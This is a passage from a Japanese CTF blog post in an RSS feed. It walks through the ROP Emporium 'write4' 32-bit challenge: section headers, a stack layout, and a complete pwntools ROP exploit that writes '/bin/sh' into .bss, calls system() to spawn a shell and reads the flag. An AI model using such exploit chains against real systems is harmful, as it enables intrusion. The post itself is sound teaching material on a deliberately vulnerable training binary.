  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .got.plt          PROGBITS        0804a000 &lt;span class=&quot;synConstant&quot;&gt;001000&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000028&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;04&lt;/span&gt;  WA  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .data             PROGBITS        0804a028 &lt;span class=&quot;synConstant&quot;&gt;001028&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000008&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  WA  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .bss              NOBITS          0804a040 &lt;span class=&quot;synConstant&quot;&gt;001030&lt;/span&gt; 00002c &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;  WA  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;32&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .comment          PROGBITS        &lt;span class=&quot;synConstant&quot;&gt;00000000&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;001030&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000034&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;01&lt;/span&gt;  MS  &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .shstrtab         STRTAB          &lt;span class=&quot;synConstant&quot;&gt;00000000&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;001861&lt;/span&gt; 00010a &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;      &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .symtab           SYMTAB          &lt;span class=&quot;synConstant&quot;&gt;00000000&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;001064&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;000510&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;synConstant&quot;&gt;30&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;50&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;
  &lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; .strtab           STRTAB          &lt;span class=&quot;synConstant&quot;&gt;00000000&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;001574&lt;/span&gt; 0002ed &lt;span class=&quot;synConstant&quot;&gt;00&lt;/span&gt;      &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;   &lt;span class=&quot;synConstant&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;
Key to Flags:
  W &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, A &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;alloc&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, X &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, M &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;merge&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, S &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, I &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;,
  L &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;link order&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, O &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;extra OS processing required&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, G &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, T &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;TLS&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;,
  C &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;compressed&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, x &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;unknown&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, o &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;OS specific&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;, E &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;exclude&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;,
  p &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;processor specific&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;
$ 
&lt;/pre&gt;


&lt;p&gt;Wの立っているところがwritableである。
今回は.&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/bss&quot;&gt;bss&lt;/a&gt;セクションを使う。&lt;/p&gt;

&lt;p&gt;最後にsystem関数の呼び出し直前のスタックの状態を考える。
以下のようにすればsystemに引数を渡すことができる。&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left;&quot;&gt;Low (↑stack &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/growth&quot;&gt;growth&lt;/a&gt;)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;...&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;system@pltのアドレス(=リターンアドレス)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;&quot;AAAA&quot; (=system()終了後のダミーの戻り先)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;0x0804a040(&quot;bin/sh&quot;のアドレス、systemの第一引数)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;...&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left;&quot;&gt;High&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;


&lt;p&gt;以上を踏まえてexploitコードは以下になる&lt;/p&gt;

&lt;pre class=&quot;code lang-python&quot; data-lang=&quot;python&quot; data-unlink&gt;&lt;span class=&quot;synPreProc&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;synPreProc&quot;&gt;import&lt;/span&gt; *

p=process(&lt;span class=&quot;synConstant&quot;&gt;&#39;./write432&#39;&lt;/span&gt;)

system_plt=&lt;span class=&quot;synConstant&quot;&gt;0x8048430&lt;/span&gt;
mov_edi_ebp=&lt;span class=&quot;synConstant&quot;&gt;0x08048670&lt;/span&gt;
pop2ret=&lt;span class=&quot;synConstant&quot;&gt;0x80486da&lt;/span&gt;
bss_addr=&lt;span class=&quot;synConstant&quot;&gt;0x0804a040&lt;/span&gt;

payload=&lt;span class=&quot;synConstant&quot;&gt;&#39;&#39;&lt;/span&gt;
payload+=&lt;span class=&quot;synConstant&quot;&gt;&#39;A&#39;&lt;/span&gt;*&lt;span class=&quot;synConstant&quot;&gt;44&lt;/span&gt;
payload+=p32(pop2ret)
payload+=p32(bss_addr)
payload+=&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;/bin&amp;quot;&lt;/span&gt;
payload+=p32(mov_edi_ebp)
payload+=p32(pop2ret)
payload+=p32(bss_addr+&lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;)
payload+=&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;/sh&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;
payload+=p32(mov_edi_ebp)
payload+=p32(system_plt)
payload+=&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;junk&amp;quot;&lt;/span&gt;
payload+=p32(bss_addr)

p.sendline(payload)
p.interactive()
&lt;/pre&gt;


&lt;p&gt;実行結果&lt;/p&gt;

&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;$ python exploit.py
&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;+&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; Starting &lt;span class=&quot;synStatement&quot;&gt;local&lt;/span&gt; process &lt;span class=&quot;synStatement&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;./write432&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&#39;&lt;/span&gt;: pid &lt;span class=&quot;synConstant&quot;&gt;10954&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; Switching to interactive mode
write4 by ROP Emporium
32bits

Go ahead and give me the string already!
&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; $ cat flag.txt
ROPE&lt;span class=&quot;synSpecial&quot;&gt;{&lt;/span&gt;a_placeholder_32byte_flag&lt;span class=&quot;synStatement&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;}&lt;/span&gt;
$ &lt;span class=&quot;synStatement&quot;&gt;exit&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; Got EOF &lt;span class=&quot;synStatement&quot;&gt;while reading in &lt;/span&gt;interactive
$ 
&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; Process &lt;span class=&quot;synStatement&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;./write432&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&#39;&lt;/span&gt; stopped with &lt;span class=&quot;synStatement&quot;&gt;exit&lt;/span&gt; code &lt;span class=&quot;synConstant&quot;&gt;-11&lt;/span&gt; &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;SIGSEGV&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;synPreProc&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;pid &lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;10954&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;[&lt;/span&gt;*&lt;span class=&quot;synStatement&quot;&gt;]&lt;/span&gt; Got EOF &lt;span class=&quot;synStatement&quot;&gt;while sending in &lt;/span&gt;interactive
$ 
&lt;/pre&gt;


&lt;p&gt;flagを入手することができた&lt;/p&gt;
</description>          <pubDate>Mon, 30 Mar 2020 15:10:37 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/26006613542694681</guid>
          
            <category>CTF pwn</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/26006613542694681/1638952784" type="image/png" length="0" />
        </item>
      
    
  </channel>
</rss>
